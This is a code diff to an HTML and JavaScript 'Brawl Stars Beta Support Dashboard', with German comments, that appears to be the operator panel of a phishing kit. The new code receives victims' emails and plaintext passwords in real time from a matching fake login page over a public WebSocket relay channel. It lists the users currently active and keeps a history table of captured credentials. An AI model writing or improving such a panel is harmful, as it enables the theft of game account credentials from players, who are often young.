@@ -72,11 +72,17 @@
             100% { opacity: 1; }
         }
 
+        .active-users-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+
         .user-card {
             background: #f8f9fa;
             border-radius: 15px;
             padding: 25px;
-            margin-bottom: 30px;
             border-left: 5px solid #1e88e5;
             transition: all 0.3s ease;
         }
@@ -174,7 +180,7 @@
             margin-top: 10px;
         }
 
-        .no-user {
+        .no-data {
             text-align: center;
             color: #666;
             font-style: italic;
@@ -201,20 +207,32 @@
             background: #f50057;
             transform: translateY(-2px);
         }
+
+        .active-users-count {
+            background: #1e88e5;
+            color: white;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 14px;
+            margin-left: 10px;
+        }
     </style>
 </head>
 <body>
     <div class="dashboard">
         <div class="dashboard-header">
-            <h1 class="dashboard-title">Brawl Stars Beta - Support Dashboard</h1>
+            <h1 class="dashboard-title">
+                Brawl Stars Beta - Support Dashboard
+                <span id="activeCount" class="active-users-count">0 aktiv</span>
+            </h1>
             <div class="live-status">
                 <div class="status-dot"></div>
                 Live Monitor
             </div>
         </div>
 
-        <div id="userActivity">
-            <div class="no-user">Warte auf Benutzeraktivität...</div>
+        <div id="activeUsers" class="active-users-container">
+            <div class="no-data">Keine aktiven Benutzer</div>
         </div>
 
         <div class="history-section">
@@ -234,80 +252,65 @@
     </div>
 
     <script>
+        // Muss identisch mit der Channel-ID der Anmeldeseite sein
+        const channelId = 'brawlstars_beta_12345';
+        const ws = new WebSocket('wss://ws.postman-echo.com/raw');
+        
+        // Aktive Benutzer und Verlauf speichern
+        const activeUsers = new Map();
         let loginHistory = [];
 
-        function loadHistory() {
-            const savedHistory = getCookie('loginHistory');
-            if (savedHistory) {
-                loginHistory = JSON.parse(savedHistory);
-                updateHistoryTable();
-            }
-        }
+        ws.onopen = () => {
+            console.log('Verbindung hergestellt');
+            updateActiveUsersView();
+        };
 
-        function saveHistory() {
-            setCookie('loginHistory', JSON.stringify(loginHistory), 7);
-        }
-
-        function clearHistory() {
-            loginHistory = [];
-            saveHistory();
-            updateHistoryTable();
-        }
-
-        function setCookie(name, value, days) {
-            const expires = new Date(Date.now() + days * 24 * 60 * 60 * 1000).toUTCString();
-            document.cookie = name + '=' + encodeURIComponent(value) + '; expires=' + expires + '; path=/';
-        }
-
-        function getCookie(name) {
-            const value = `; ${document.cookie}`;
-            const parts = value.split(`; ${name}=`);
-            if (parts.length === 2) return decodeURIComponent(parts.pop().split(';').shift());
-        }
-
-        function updateHistoryTable() {
-            const tbody = document.getElementById('historyBody');
-            tbody.innerHTML = loginHistory.map(entry => `
-                <tr>
-                    <td>${entry.timestamp}</td>
-                    <td>${entry.email}</td>
-                    <td>${entry.password}</td>
-                </tr>
-            `).join('');
-        }
-
-        function checkUserActivity() {
-            const userActivityDiv = document.getElementById('userActivity');
-            const userData = localStorage.getItem('currentUser');
-
-            if (userData) {
-                const user = JSON.parse(userData);
-                const timeSinceUpdate = Date.now() - user.lastUpdate;
-                const isActive = timeSinceUpdate < 2000;
-
-                if (isActive && user.email && user.password) {
-                    // Neuen Eintrag zum Verlauf hinzufügen
-                    const existingEntry = loginHistory.find(entry => 
-                        entry.email === user.email && 
-                        entry.password === user.password
-                    );
-
-                    if (!existingEntry) {
-                        loginHistory.unshift({
-                            timestamp: new Date().toLocaleString(),
-                            email: user.email,
-                            password: user.password
-                        });
-                        saveHistory();
-                        updateHistoryTable();
-                    }
+        ws.onmessage = (event) => {
+            const message = JSON.parse(event.data);
+            
+            // Nur Nachrichten für unseren Channel verarbeiten
+            if (message.channelId === channelId) {
+                switch(message.type) {
+                    case 'update':
+                        handleUserUpdate(message);
+                        break;
+                    case 'login':
+                        handleLogin(message);
+                        break;
+                    case 'close':
+                        handleUserClose(message);
+                        break;
                 }
+            }
+        };
 
-                userActivityDiv.innerHTML = `
+        function handleUserUpdate(message) {
+            activeUsers.set(message.sessionId, message.data);
+            updateActiveUsersView();
+        }
+
+        function handleLogin(message) {
+            loginHistory.unshift(message.data);
+            updateHistoryView();
+        }
+
+        function handleUserClose(message) {
+            activeUsers.delete(message.sessionId);
+            updateActiveUsersView();
+        }
+
+        function updateActiveUsersView() {
+            const activeUsersDiv = document.getElementById('activeUsers');
+            const activeCount = document.getElementById('activeCount');
+            
+            if (activeUsers.size > 0) {
+                activeCount.textContent = `${activeUsers.size} aktiv`;
+                
+                activeUsersDiv.innerHTML = Array.from(activeUsers.values()).map(user => `
                     <div class="user-card">
                         <div class="info-row">
                             <span class="info-label">Status</span>
-                            <span class="info-value">${isActive ? 'Aktiv' : 'Inaktiv'}</span>
+                            <span class="info-value">Aktiv</span>
                         </div>
                         <div class="info-row">
                             <span class="info-label">E-Mail</span>
@@ -319,16 +322,52 @@
                         </div>
                         <div class="timestamp">Letzte Aktivität: ${user.timestamp}</div>
                     </div>
-                `;
+                `).join('');
             } else {
-                userActivityDiv.innerHTML = '<div class="no-user">Warte auf Benutzeraktivität...</div>';
+                activeCount.textContent = '0 aktiv';
+                activeUsersDiv.innerHTML = '<div class="no-data">Keine aktiven Benutzer</div>';
             }
         }
 
-        // Initialisierung
-        loadHistory();
-        setInterval(checkUserActivity, 500);
-        checkUserActivity();
+        function updateHistoryView() {
+            const tbody = document.getElementById('historyBody');
+            
+            if (loginHistory.length > 0) {
+                tbody.innerHTML = loginHistory.map(entry => `
+                    <tr>
+                        <td>${entry.timestamp}</td>
+                        <td>${entry.email}</td>
+                        <td>${entry.password}</td>
+                    </tr>
+                `).join('');
+            } else {
+                tbody.innerHTML = '<tr><td colspan="3" class="no-data">Keine Einträge im Verlauf</td></tr>';
+            }
+        }
+
+        function clearHistory() {
+            if (confirm('Möchten Sie wirklich den gesamten Verlauf löschen?')) {
+                loginHistory = [];
+                updateHistoryView();
+            }
+        }
+
+        // Alte Benutzer automatisch entfernen (Timeout nach 5 Minuten)
+        setInterval(() => {
+            const now = Date.now();
+            let updated = false;
+            
+            for (const [sessionId, user] of activeUsers.entries()) {
+                if (now - user.lastUpdate > 300000) { // 5 Minuten
+                    activeUsers.delete(sessionId);
+                    updated = true;
+                }
+            }
+            
+            if (updated) {
+                updateActiveUsersView();
+            }
+        }, 30000); // Alle 30 Sekunden prüfen
     </script>
 </body>
 </html>
